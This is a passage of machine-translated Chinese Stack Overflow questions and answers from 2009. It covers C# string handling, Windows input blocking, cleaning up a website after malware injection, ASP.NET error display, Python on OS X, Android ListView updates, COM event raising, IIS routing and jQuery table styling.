const char CarriageReturn = '\r'; // #13
const char LineFeed = '\n'; // #10
string temp = new System.Text.RegularExpressions.Regex(
                  string.Format("{0}?{1}", CarriageReturn, LineFeed)
              ).Replace(mystring, string.Empty); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-03-16T19:01:07.973

```
string temp = mystring.Replace("\n", " "); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-03-16T19:55:48.873

@gnomixa - 你在评论中没有取得任何成就是什么意思？以下适用于我在 VS2005 中。

如果您的目标是删除换行符，从而缩短字符串，请查看以下内容：

```
 string originalStringWithNewline = "12\n345"; // length is 6
        System.Diagnostics.Debug.Assert(originalStringWithNewline.Length == 6);
        string newStringWithoutNewline = originalStringWithNewline.Replace("\n", ""); // new length is 5
        System.Diagnostics.Debug.Assert(newStringWithoutNewline.Length == 5); 
```

如果您的目标是用空格字符替换换行符，使字符串长度保持不变，请查看以下示例：

```
 string originalStringWithNewline = "12\n345"; // length is 6
        System.Diagnostics.Debug.Assert(originalStringWithNewline.Length == 6);
        string newStringWithoutNewline = originalStringWithNewline.Replace("\n", " "); // new length is still 6
        System.Diagnostics.Debug.Assert(newStringWithoutNewline.Length == 6); 
```

而且您必须替换单个字符串而不是字符，因为 '' 不是要传递给 Replace(string,char) 的有效字符

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2012-10-11T14:52:40.977

在[Bytes.com](http://bytes.com/topic/c-sharp/answers/277739-empty-character-literal)上找到：

`string temp = mystring.Replace('\n', '\0');// '\0'`表示一个空字符

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2013-01-20T19:45:23.607

我知道这是一篇旧帖子，但我想添加我的方法。

```
public static string Replace(string text, string[] toReplace, string replaceWith)
    {
        foreach (string str in toReplace)
           text = text.Replace(str, replaceWith);

        return text;
    } 
```

示例用法：

```
string newText = Replace("This is an \r\n \n an example.", new string[] { "\r\n", "\n" }, ""); 
```

# winapi - 在 Vista 中阻止来自服务的鼠标输入

> ID：651708
> 
> 赞同：0
> 
> 时间：2009-03-16T18:58:39.010
> 
> 标签：winapi, windows-vista

我在大学校园内维护着各种托管用户实验室。这些机器目前都运行 Windows XP，我们有一个 Windows 服务，用于通过阻止任何键盘或鼠标输入来“锁定”机器。锁定发生在我们的脚本操作系统安装期间，因此用户无法意外停止或中断该过程。它还用于防止用户在给定实验室的前台签出之前登录机器。Ctrl+Alt+Del 通过键盘过滤器驱动程序被阻止，其余的键和鼠标当前使用user32.dll中的[BlockInput()函数被阻止。](http://msdn.microsoft.com/en-us/library/ms646290.aspx)

在 XP 中，服务作为本地系统运行，并且必须从 BlockInput() 调用中启用“允许服务与桌面交互”复选框才能成功。在 Vista 下，我猜这不再有效，因为[Session 0 隔离](http://msdn.microsoft.com/en-us/library/bb203962.aspx)更改。调用成功，但输入实际上并没有被阻塞。

键盘过滤器驱动程序仍然可以正常工作，我们可以使用它来阻止整个键盘，而不仅仅是 Ctrl+Alt+Del。但是我不知道我们现在要如何阻止鼠标。我什至不完全确定 Session 0 隔离是罪魁祸首。

谁能推荐一个修复或解决方法，以允许我们阻止来自 Vista 及更高版本服务的鼠标输入？我一直在寻找替代的 win32 API，但没有运气。假设 Session 0 隔离是罪魁祸首，是否有合法的方式从 Session 1 调用该函数，或者这种方式会破坏隔离的目的？我是否必须依赖在用户登录时运行并与服务通信的提升的伴侣 exe？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-16T19:26:44.590

从服务中，您可以使用 WTSEnumerateSessions 获取所有登录的用户会话，使用 WTSQueryUserToken 获取登录用户的令牌，然后使用带有该令牌的 CreateProcessAsUser 来获取在用户桌面上运行的代码。这样做的缺点是代码将以登录用户身份运行。由于所有输入都被禁用，这可能足够安全，并且至少与现有的 XP 解决方案一样安全。]

编辑： BlockInput 需要较高的强制性完整性级别。您可以尝试将此组添加到令牌中，但随后您的代码在桌面上运行的权限更高，并且可能会受到攻击。

另一种方法可能是使用您的服务来禁用机器上的所有 HID 类设备。

# asp.net - 你知道有什么工具可以从我的网站上删除谷歌阻止的恶意软件和恶意软件吗？

> ID：651713
> 
> 赞同：1
> 
> 时间：2009-03-16T18:59:38.897
> 
> 标签：asp.net, javascript, html, security, web

我有一个被谷歌阻止的网站，因为它有恶意软件我从服务器中删除了病毒，现在它完全干净了，这个病毒在网站中的 html、js asp 文件中改变的问题，并添加了隐藏的 iframe 和奇怪的脚本，我删除了我在 diles 中找到的所有内容，但是网站太大了，所以任何人都可以使用任何工具来删除这个恶意软件的所有影响？

谷歌给了我这个网站作为从我的网站上删除恶意软件的参考 [http://www.stopbadware.org/home/security](http://www.stopbadware.org/home/security)

谢谢，

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T19:00:43.997

擦除服务器上的所有内容，检查所有文件，如果它们是干净的，则重新上传它们。只有你能做的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-16T19:07:44.823

从您的源代码管理数据库上传最新版本的站点。如果您不遵循源代码控制，那么您就该开始这样做了。;-)

找到一个好的搜索和替换工具。如果您使用的是 Dream weaver，那么您可以进行站点范围的搜索。这同样适用于 Visual Interdev。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-17T04:28:34.443

+1 威廉的评论。您可以对特定感染留下的特征字符串执行简单的[grep](http://www.linfo.org/grep.html)，例如“<iframe”或编码脚本的开头，但如果没有手动检查，您无法确定找到所有发生的更改. 这就是在本地计算机上拥有干净副本的目的。

> 我从服务器中删除了病毒

真的吗？你清除了[rootkit](http://en.wikipedia.org/wiki/Rootkit)吗？你怎么能确定？感染后，恢复干净服务器的唯一可靠方法是从操作系统向上重新安装其上的所有内容。

您是否发现并修复了入侵者用来进入的方法？如果没有，您可以确定另一个俄罗斯恶意软件团伙的自动攻击将很快回来。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-10-08T07:23:04.817

试试 soswebscan

使用 soswebscan 免费扫描您的网站。

欲了解更多详情，请访问 soswebscan 网站：[http ://soswebscan.jobandproject.com](http://soswebscan.jobandproject.com)

# c# - 如何在 ASP.NET Web 应用程序中显示错误消息

> ID：651716
> 
> 赞同：4
> 
> 时间：2009-03-16T19:00:03.593
> 
> 标签：c#, asp.net, custom-errors

我有一个 ASP.NET Web 应用程序，我想知道在引发异常时如何显示错误消息框。

例如，

```
 try
    {
        do something
    }
    catch 
    {
        messagebox.write("error"); 
        //[This isn't the correct syntax, just what I want to achieve]
    } 
```

[消息框显示错误]

谢谢

**[如何在Web应用程序asp.net c#中显示错误消息框的](https://stackoverflow.com/questions/651592/how-to-display-an-error-message-box-in-a-web-application-asp-net-c/651601)**重复****

 *** * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-16T19:06:55.230

大致你可以这样做：

```
try
{
    //do something
}
catch (Exception ex)
{
    string script = "<script>alert('" + ex.Message + "');</script>";
    if (!Page.IsStartupScriptRegistered("myErrorScript"))
    {
         Page.ClientScript.RegisterStartupScript("myErrorScript", script);
    }
} 
```

但我建议您定义自定义异常并将其扔到您需要的任何地方。在您的页面上捕获此自定义异常并注册您的消息框脚本。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-16T19:04:47.230

ASP.Net 中的错误保存在 Server.GetLastError 属性中，

或者我会在 asp.net 页面上贴一个标签来显示错误。

```
try
{
    do something
}
catch (YourException ex)
{
    errorLabel.Text = ex.Message;
    errorLabel.Visible = true;
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-16T19:09:43.600

您所需要的只是一个可以设置其文本的控件，以及一个 UpdatePanel（如果在回发期间发生异常）。

如果在回发期间发生：标记：

```
<ajax:UpdatePanel id="ErrorUpdatePanel" runat="server" UpdateMode="Coditional">
<ContentTemplate>
<asp:TextBox id="ErrorTextBox" runat="server" />
</ContentTemplate>
</ajax:UpdatePanel> 
```

代码：

```
try
{
do something
}

catch(YourException ex)
{
this.ErrorTextBox.Text = ex.Message;
this.ErrorUpdatePanel.Update();
} 
```

# python - 目前哪个版本的python最适合os x？

> ID：651717
> 
> 赞同：2
> 
> 时间：2009-03-16T19:00:09.257
> 
> 标签：python, macos

在经历了地狱般的尝试安装最新版本的 postgresql 和 psycopg2 之后，我今天将完全重新安装 Leopard。

过去一年我一直坚持使用 macpython 2.5，但现在我正在考虑使用 macports 甚至 2.6

对我来说，最重要的是 Twisted、PIL 和 psycopg2 能够正常工作。

任何人都可以根据经验为我应该选择哪个版本提供一些指导吗？

编辑：

好的，我决定不重新安装操作系统。四处乱砍以清理不良的 PostgresPlus 安装并安装了另一个。官方的 python 2.6.1 包很好用，与 2.5.2 一起安装没问题。Psycopg2 有效。但正如预期的那样，PIL 不会编译。

我想我会在 macports 的 2.5 和官方的 2.6 之间切换以完成不同的任务，因为我知道 macports python 的某些软件包存在问题。

另一个编辑：

我现在已经编译了 PIL。必须隐藏整个 macports 目录和一半的 xcode 库，这样它才能找到正确的库。它不会接受我喂它的路径。PIL 因在豹上而臭名昭著。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T19:14:10.937

您可以并排安装它们。如果您遇到问题，只需将 python 2.5 设置为标准 python 并使用例如`python26`更新的版本。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-16T19:31:46.997

读这个

[http://farmdev.com/thoughts/66/python-3-0-on-mac-os-x-alongside-2-6-2-5-etc-/](http://farmdev.com/thoughts/66/python-3-0-on-mac-os-x-alongside-2-6-2-5-etc-/)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-16T19:36:50.040

我仍然使用 macports python25，因为很多其他包都依赖它，并且没有更新为使用 python26。

```
$ port dependents python25
gnome-doc-utils depends on python25
mod_python25 depends on python25
postgresql83 depends on python25
gtk-doc depends on python25
at-spi depends on python25
gnome-desktop depends on python25
mercurial depends on python25 
```

这不包括`py25-*`我已安装​​的软件包。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-16T22:50:30.527

我今天就这个主题写了一些东西，我的建议？运行多个版本，然后将 virtualenv 拍下来以划分事物。

[http://jessenoller.com/2009/03/16/so-you-want-to-use-python-on-the-mac/](http://jessenoller.com/2009/03/16/so-you-want-to-use-python-on-the-mac/)

我也不会同时使用macports。我认为没有必要。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T19:12:20.257

我已经将运行 leopard 的 macbook 更新到了 python 2.6，并且 psycopg2 没有任何问题。就此而言，我在 2.6 的任何地方都没有遇到任何兼容性问题，但如果您担心向后兼容性，显然不建议您切换到 python3k。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-16T19:32:28.430

我会坚持使用 MacPython 版本 2.5.x（我相信目前是 2.5.4）。这是我的理由：

1.  Snow Leopard 可能仍然在 2.5 系列上，因此您不妨与未来的 OS 保持一致（即没有必要走得太远）。
2.  对于大多数生产应用程序，没有人愿意再使用 2.6 年。
3.  任何框架/程序都不会在至少 2 年内将 2.5 抛在后面。

换句话说，我的做法是，做 2.6 的唯一原因是为了好玩。如果您想玩得开心，请选择 3.0。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-03-16T20:14:26.957

我在 OSX 上广泛使用 Twisted 和 Psycopg2，两者都可以在 Python 2.6 上正常工作。据我所知，两者都没有移植到 Python 3.0。

Python 3.0 的一些特性已向后移植到 2.6，因此从 2.5 迁移到 2.6 可以获得相当多的收益。但是在所有第三方库都支持之前，我不会切换到 3.0；这可能在一段时间内不会发生。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-05-14T23:02:49.200

我在安装 PIL 时遇到了一些麻烦。我编译了它，它与这篇文章[http://passingcuriosity.com/2009/installing-pil-on-mac-os-x-leopard/](http://passingcuriosity.com/2009/installing-pil-on-mac-os-x-leopard/)中解释的修改一起工作， 之后它工作正常。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-03-16T22:58:35.220

我正在使用 Python 2.5.1。它对我来说非常适合一般脚本和一些 CherryPy Web 项目。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-07-12T04:31:27.360

如果您使用 Macports，我建议您下载 python_select 包，它有助于在不同版本之间轻松切换，*包括*内置的苹果版本。让生活轻松很多。

# android - Android：线程从网络加载数据后更新Listview

> ID：651733
> 
> 赞同：15
> 
> 时间：2009-03-16T19:03:11.807
> 
> 标签：android, listview

1.  我喜欢当用户启动应用程序时我的 GUI 会立即出现。
2.  然后在后台加载一些数据（文本、图片）（如 YouTube 应用程序）。
3.  ListView 和 Gallery 会使用这些新数据自动更新。

我启动我的 ListView，启动一个线程并加载数据......然后 ListView 没有得到更新！有几个人告诉我应该使用`notifyDataSetChanged()`. 但我不能将此命令放在我的线程中（只是未知）。

有任何想法吗？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-05-31T03:38:04.983

我有同样的问题......当我遇到这个问题时我很兴奋。但没有答案？:-(

之后，让问题搁置了大约两个星期，我在[这里找到了解决方案](http://helloandroid.com/node/243)：

长话短说：

从上面的链接引用：

> 我们必须使用 Handler 对象，因为我们无法在单独的线程中更新大多数 UI 对象。当我们向 Handler 发送消息时，它会被保存到队列中并尽快由 UI 线程执行。

一旦你检查了代码，你就会明白作者在说什么。
注意：即使使用处理程序，Android 也可能不允许您从线程的 run() 方法更新视图对象。我收到了这个错误：

```
05-31 02:12:17.064: ERROR/AndroidRuntime(881):
android.view.ViewRoot$CalledFromWrongThreadException: 
Only the original thread that created a view hierarchy can touch its views. 
```

为了解决这个问题，我在 run() 方法中更新了一个数据数组，并使用该数组来更新处理程序的 handleMessage() 方法中的视图。

我希望这可以帮助其他人。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2010-04-30T13:17:04.450

您可以使用 slowAdapter 来刷新视图：

```
SlowAdapter slowAdapter = new SlowAdapter(this);

list.setAdapter(slowAdapter);
slowAdapter.notifyDataSetChanged(); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2010-06-15T05:51:57.893

只是在阅读此线程并尝试时自己发现了它。

简短：*AsyncTask*的*onProgressUpdate*方法可以*触摸视图*：http: [//developer.android.com/reference/android/os/AsyncTask.html#onProgressUpdate(Progress...)](http://developer.android.com/reference/android/os/AsyncTask.html#onProgressUpdate(Progress...))

背景：我需要在光标上调用 requery，以便在任务填充数据库时不断更新 ListView。*在 doInBackground 中进行的重新*查询调用因提到的*CalledFromWrongThreadException*而失败，但*onProgressUpdate*中的相同代码有效。

 **# c - 在 COM 嵌入式 IE 中设置 Accept-Language

> ID：651734
> 
> 赞同：6
> 
> 时间：2009-03-16T19:03:16.750
> 
> 标签：c, internet-explorer, com

我使用 COM 在我的 C 应用程序中嵌入了一个 IE 实例。使用 IWebBrowser2.Navigate 我可以传递要与请求一起发送的标头，但显然是“Accept-Language”。似乎 IE 本身的语言设置总是覆盖我为该标题传递的值。有没有办法解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-29T13:18:01.927

您是否尝试过调用[SetThreadLocale](http://msdn.microsoft.com/en-us/library/dd374051.aspx)？也许 IE 会忽略标题以支持用户的语言设置。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2010-01-30T10:42:19.993

我不认为 IE 允许您自定义设置这么多。从未在 C 中使用过，但 Delphi 有一个 IWebBrowser2 (TWebBrowser) 的包装类，并且组件使用的大多数设置都是全局的。我的意思是，标准 IE 和嵌入式 IE 相同。

也许您可以在 Internet 选项上更改它，甚至修改一些注册表项，但请注意它也将全局应用（嵌入或不嵌入）。

# c# - 使用互操作引发 vb6 事件

> ID：651738
> 
> 赞同：6
> 
> 时间：2009-03-16T19:04:18.713
> 
> 标签：c#, vb6, interop

我有一个旧版 VB6 组件，我已使用 tlbimp.exe 将其导入 VS 以生成我的互操作程序集。VB6 组件定义了一个允许我在 VB6 中传递消息的事件。

```
Public Event Message(ByVal iMsg As Variant, oCancel As Variant) 
```

我真的很希望能够在我的 C# 程序中提出这个问题，但是它作为一个事件被导入，而不是一个委托或其他有用的东西。所以，我只能听，但不能开火。有谁知道如何触发包含在 VB6 中的事件？C# 事件看起来像

```
[TypeLibType(16)]
[ComVisible(false)]
 public interface __MyObj_Event
 {
     event __MyObj_MessageEventHandler Message;
 } 
```

不幸的是，我无法更改 VB6 代码。谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-22T05:19:48.100

事实上，希望还没有消失。可以从对象的类之外在 COM 对象*上*引发事件。此功能实际上是由 COM 本身提供的，尽管是以间接方式提供的。

在 COM 中，事件在发布/订阅模型上工作。具有事件的 COM 对象（“事件源”）发布事件，并且一个或多个其他 COM 对象通过将事件处理程序附加到源对象（处理程序称为“事件接收器”）来订阅事件。通常，源对象通过简单地循环所有事件接收器并调用适当的处理程序方法来引发事件。

那么这对你有什么帮助呢？碰巧 COM 允许您查询事件源以获取当前订阅源对象事件的所有事件接收器对象的列表。获得事件接收器对象列表后，您可以通过调用每个接收器对象的事件处理程序来模拟引发事件。

**注意：** *我过度简化了细节并且对一些术语很自由，但这是关于事件在 COM 中如何工作的简短版本（并且在政治上有些不正确）。*

您可以利用这些知识从外部代码引发 COM 对象上的事件。事实上，借助`System.Runtime.Interop`and`System.Runtime.Interop.ComTypes`命名空间中的 COM 互操作支持，可以在 C# 中完成所有这些工作。

* * *

**编辑**

我编写了一个实用程序类，它允许您从 .NET 引发 COM 对象上的事件。它很容易使用。这是使用您问题中的事件接口的示例：

```
MyObj legacyComObject = new MyObj();

// The following code assumes other COM objects have already subscribed to the 
// MyObj class's Message event at this point.
//
// NOTE: VB6 objects have two hidden interfaces for classes that raise events:
//
// _MyObj (with one underscore): The default interface.
// __MyObj (with two underscores): The event interface.
//
// We want the second interface, because it gives us a delegate
// that we can use to raise the event.
// The ComEventUtils.GetEventSinks<T> method is a convenience method
// that returns all the objects listening to events from the legacy COM object.

// set up the params for the event
string messageData = "Hello, world!";
bool cancel = false;

// raise the event by invoking the event delegate for each connected object...
foreach(__MyObj sink in ComEventUtils.GetEventSinks<__MyObj>(legacyComObject))
{
    // raise the event via the event delegate
    sink.Message(messageData, ref cancel);

    if(cancel == true)
    {
        // do cancel processing (just an example)
        break;
    }
} 
```

下面是`ComEventUtils`该类的代码（以及辅助类，`SafeIntPtr`因为我很偏执，想要一种很好的方法来处理`IntPtr`COM 相关代码所需的 S）：

**免责声明**：*我没有彻底测试下面的代码。该代码在一些地方执行手动内存管理，因此它可能会在您的代码中引入内存泄漏。另外，我没有在代码中添加错误处理，因为这只是一个示例。小心使用。*

```
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using COM = System.Runtime.InteropServices.ComTypes;

namespace YourNamespaceHere
{

/// <summary>
/// A utility class for dealing with COM events.
/// Needs error-handling and could potentially be refactored
/// into a regular class. Also, I haven't extensively tested this code;
/// there may be a memory leak somewhere due to the rather
/// low-level stuff going on in the class, but I think I covered everything.
/// </summary>
public static class ComEventUtils
{
    /// <summary>
    /// Get a list of all objects implementing an event sink interface T
    /// that are listening for events on a specified COM object.
    /// </summary>
    /// <typeparam name="T">The event sink interface.</typeparam>
    /// <param name="comObject">The COM object whose event sinks you want to retrieve.</param>
    /// <returns>A List of objects that implement the given event sink interface and which
    /// are actively listening for events from the specified COM object.</returns>
    public static List<T> GetEventSinks<T>(object comObject)
    {
        List<T> sinks = new List<T>();
        List<COM.IConnectionPoint> connectionPoints = GetConnectionPoints(comObject);

        // Loop through the source object's connection points, 
        // find the objects that are listening for events at each connection point,
        // and add the objects we are interested in to the list.
        foreach(COM.IConnectionPoint connectionPoint in connectionPoints)
        {
            List<COM.CONNECTDATA> connections = GetConnectionData(connectionPoint);

            foreach (COM.CONNECTDATA connection in connections)
            {
                object candidate = connection.pUnk;

                // I tried to avoid relying on try/catch for this
                // part, but candidate.GetType().GetInterfaces() kept
                // returning an empty array.
                try
                {
                    sinks.Add((T)candidate);
                }
                catch { }
            }

            // Need to release the interface pointer in each CONNECTDATA instance
            // because GetConnectionData implicitly AddRef's it.
            foreach (COM.CONNECTDATA connection in connections)
            {
                Marshal.ReleaseComObject(connection.pUnk);
            }
        }

        return sinks;
    }

    /// <summary>
    /// Get all the event connection points for a given COM object.
    /// </summary>
    /// <param name="comObject">A COM object that raises events.</param>
    /// <returns>A List of IConnectionPoint instances for the COM object.</returns>
    private static List<COM.IConnectionPoint> GetConnectionPoints(object comObject)
    {
        COM.IConnectionPointContainer connectionPointContainer = (COM.IConnectionPointContainer)comObject;
        COM.IEnumConnectionPoints enumConnectionPoints;
        COM.IConnectionPoint[] oneConnectionPoint = new COM.IConnectionPoint[1];
        List<COM.IConnectionPoint> connectionPoints = new List<COM.IConnectionPoint>();

        connectionPointContainer.EnumConnectionPoints(out enumConnectionPoints);
        enumConnectionPoints.Reset();

        int fetchCount = 0;
        SafeIntPtr pFetchCount = new SafeIntPtr();

        do
        {
            if (0 != enumConnectionPoints.Next(1, oneConnectionPoint, pFetchCount.ToIntPtr()))
            {
                break;
            }

            fetchCount = pFetchCount.Value;

            if (fetchCount > 0)
                connectionPoints.Add(oneConnectionPoint[0]);

        } while (fetchCount > 0);

        pFetchCount.Dispose();

        return connectionPoints;
    }

    /// <summary>
    /// Returns a list of CONNECTDATA instances representing the current
    /// event sink connections to the given IConnectionPoint.
    /// </summary>
    /// <param name="connectionPoint">The IConnectionPoint to return connection data for.</param>
    /// <returns>A List of CONNECTDATA instances representing all the current event sink connections to the 
    /// given connection point.</returns>
    private static List<COM.CONNECTDATA> GetConnectionData(COM.IConnectionPoint connectionPoint)
    {
        COM.IEnumConnections enumConnections;
        COM.CONNECTDATA[] oneConnectData = new COM.CONNECTDATA[1];
        List<COM.CONNECTDATA> connectDataObjects = new List<COM.CONNECTDATA>();

        connectionPoint.EnumConnections(out enumConnections);
        enumConnections.Reset();

        int fetchCount = 0;
        SafeIntPtr pFetchCount = new SafeIntPtr();

        do
        {
            if (0 != enumConnections.Next(1, oneConnectData, pFetchCount.ToIntPtr()))
            {
                break;
            }

            fetchCount = pFetchCount.Value;

            if (fetchCount > 0)
                connectDataObjects.Add(oneConnectData[0]);

        } while (fetchCount > 0);

        pFetchCount.Dispose();

        return connectDataObjects;
    }
} //end class ComEventUtils

/// <summary>
/// A simple wrapper class around an IntPtr that
/// manages its own memory.
/// </summary>
public class SafeIntPtr : IDisposable
{
    private bool _disposed = false;
    private IntPtr _pInt = IntPtr.Zero;

    /// <summary>
    /// Allocates storage for an int and assigns it to this pointer.
    /// The pointed-to value defaults to 0.
    /// </summary>
    public SafeIntPtr()
        : this(0)
    {
        //
    }

    /// <summary>
    /// Allocates storage for an int, assigns it to this pointer,
    /// and initializes the pointed-to memory to known value.
    /// <param name="value">The value this that this <tt>SafeIntPtr</tt> points to initially.</param>
    /// </summary>
    public SafeIntPtr(int value)
    {
        _pInt = Marshal.AllocHGlobal(sizeof(int));
        this.Value = value;
    }

    /// <summary>
    /// Gets or sets the value this pointer is pointing to.
    /// </summary>
    public int Value
    {
        get 
        {
            if (_disposed)
                throw new InvalidOperationException("This pointer has been disposed.");
            return Marshal.ReadInt32(_pInt); 
        }

        set 
        {
            if (_disposed)
                throw new InvalidOperationException("This pointer has been disposed.");
            Marshal.WriteInt32(_pInt, Value); 
        }
    }

    /// <summary>
    /// Returns an IntPtr representation of this SafeIntPtr.
    /// </summary>
    /// <returns></returns>
    public IntPtr ToIntPtr()
    {
        return _pInt;
    }

    /// <summary>
    /// Deallocates the memory for this pointer.
    /// </summary>
    public void Dispose()
    {
        if (!_disposed)
        {
            Marshal.FreeHGlobal(_pInt);
            _disposed = true;
        }
    }

    ~SafeIntPtr()
    {
        if (!_disposed)
            Dispose();
    }

} //end class SafeIntPtr

} //end namespace YourNamespaceHere 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-17T12:34:23.230

在 VB6 中，事件只能从声明事件的类（或窗体，视情况而定）中引发。要强制在 VB6 中引发事件，您需要在类上公开一个方法来执行此操作。如果你没有源代码，那你就不走运了。

从文档

> RaiseEvent 事件名称 [(argumentlist)]
> 
> 必需的 eventname 是在**模块中声明**的事件的名称， 并遵循 Basic 变量命名约定。

例如

```
Option Explicit

Private FText As String

Public Event OnChange(ByVal Text As String)

'This exposes the raising the event

Private Sub Change(ByVal Text As String)
  RaiseEvent OnChange(Text)
End Sub

Public Property Get Text() As String
  Text = FText
End Property

Public Property Let Text(ByVal Value As String)
  FText = Value
  Call Change(Value)
End Property 
```

很抱歉成为坏消息的承担者。

# asp.net - IIS6 和 II7 经典模式的 Web 路由？*不是* MVC

> ID：651740
> 
> 赞同：2
> 
> 时间：2009-03-16T19:04:25.110
> 
> 标签：asp.net, iis-7, iis-6, web-config, url-routing

根据 msdn.microsoft.com 站点，.NET 3.5 路由应该在 IIS6 和 II7 下以经典模式工作。我已经对 web.config 文件进行了修改，并在 IIS7 集成模式下进行了测试，效果很好。

我很想保持 IIS7 的集成，但我的虚拟主机仍然只是 IIS6（使用 .net 3.5）。

所以......有人让这个工作吗？

我目前遇到 404 错误，唯一的开关是从应用程序上的 IIS7 集成到 IIS7 经典。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T19:26:25.993

互联网的乐趣......继续搜索和改写，你自己找到了。:)

对于后代，答案是启用通配符映射，通过 ASP.NET ISAPI 路由所有请求。

# c# - C# 从 wmv 文件中抓取框架

> ID：651759
> 
> 赞同：1
> 
> 时间：2009-03-16T19:10:21.103
> 
> 标签：c#, directx, wmv

有谁知道是否可以使用 C# 从位置 X 上的视频 (.wmv) 中获取帧/图像，而无需安装 DirectX 并在 Windows 2008 上工作（我希望尽可能少安装的网络服务器）。

甚至使用 directx 的简单解决方案也可以。

亨克

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T19:35:25.723

您实际上需要研究的是[DirectShow](http://en.wikipedia.org/wiki/DirectShow)，它是 Windows 的通用媒体（音频和视频）库。它曾经是 DirectX 的一部分，但几年前它分支并成为 Windows（平台）SDK 的一部分。我还应该在这里指出，自从 Windows Vista 支持[Media Foundation](http://en.wikipedia.org/wiki/Media_Foundation)以来，它现在已被弃用。从我读过的内容来看，它是一个更好的库（DirectShow 对于复杂的任务来说是地狱），但不幸的是，由于缺乏对 XP 和更早版本的支持，目前仅针对 Media Foundation 并不可行......

我能做的最好的事情就是向您指出[DirectShow.NET](http://directshownet.sourceforge.net/)，它是 DirectShow 的 .NET 包装库，目前相当稳定且经过良好测试。它包括可以帮助您开始的各种示例，但绝不是一个简单的解决方案。另外，我强烈建议您查看[此 CodeProject 文章](http://www.codeproject.com/KB/game/VidTextureClassWebcamApp.aspx)/示例应用程序。它处理网络摄像头视频捕获和文件（包括 WMV）的视频播放。稍微玩一下，学习如何进行帧搜索/单帧捕获（我认为该项目甚至*可能*有一些代码来做到这一点）应该可以满足您的需求。也许您甚至会在该 CodeProject 应用程序的 DirectShow.NET 示例中的某处找到精确的解决方案。

当然，如果可以的话，我会建议一个更简单的解决方案，但是你现在几乎被 DirectShow 的可怕所困扰。总之祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T19:30:39.900

你应该试试[FFmpeg](http://ffmpeg.mplayerhq.hu/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-08-20T14:26:58.870

查看 Windows Media Format SDK，它旨在让您直接访问 WMV (/WMA/ASF) 文件中的帧。

[http://msdn.microsoft.com/en-us/library/dd757738(VS.85).aspx](http://msdn.microsoft.com/en-us/library/dd757738(VS.85).aspx)

特别是，您对用于读取这些文件的同步 API 感兴趣（IWMSyncReader 是接口名称）。WMFSDK 中有一些相当不错的示例；我相信对您来说最有趣的将是 WMSyncReader，它将向您展示如何从位置 X 开始挖掘 WMV 文件并获取帧。

# asp.net - ASP .Net 成员访问规则

> ID：651763
> 
> 赞同：1
> 
> 时间：2009-03-16T19:11:57.167
> 
> 标签：asp.net, membership, rules

嗨，我在本地服务器上设置了访问规则，它们工作正常。但是，当我将它们部署到我的登台服务器上时，规则不起作用。规则存储在哪里？我的本地服务器和登台服务器都指向同一个数据库服务器。感谢您的任何见解。

我在 ASP.Net Web 应用程序管理中设置了访问规则

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2011-09-07T20:21:58.720

每个安全文件夹都有一个`web.config`定义该路径访问规则的文件。将它们复制到您的服务器。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T19:57:10.507

如果您的意思是角色/用户限制，这些限制在 web.config 中。内置的 roleprovider 和 membersprovider 将用户和角色存储在 db 中，但允许/拒绝角色在 web.config 中（或在您为此执行的自定义代码中）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-09-07T20:28:15.650

成员信息存储在 ASPNETDB 数据库中，默认情况下位于 app_data 文件夹中。检查您的 web.config 是否有以下内容：

```
<connectionStrings>
<add name="ApplicationServices"
     connectionString="data source=.\SQLEXPRESS;Integrated Security=SSPI;AttachDBFilename=|DataDirectory|\aspnetdb.mdf;User Instance=true"
     providerName="System.Data.SqlClient" /> 
```

# .net - 如何使用jQuery根据单元格内容设置表格的行类？

> ID：651766
> 
> 赞同：0
> 
> 时间：2009-03-16T19:13:40.690
> 
> 标签：.net, asp.net, jquery

我有下表：

```
<table class="grid">
    <thead>
        <tr>
            <th>Name</th>
            <th>Status</th>
        <tr>
    </thead>
    <tbody>
        <tr>
            <td>Project 1</td>
            <td>Closed</td>
        <tr>
        <tr>
            <td>Project 2</td>
            <td>Open</td>
        <tr>
        <tr>
            <td>Project 3</td>
            <td>Closed</td>
        <tr>
    </tbody>
</table> 
```

我正在尝试将我以前在代码隐藏中执行的一些 UI 代码移动到 jQuery。每当状态（第 2 列）列的值为打开时，我想更改 TR 元素的类。

使用 jQuery 执行此操作的最佳方法是什么？

* * *

## 回答 #1

> 赞同：6
> 
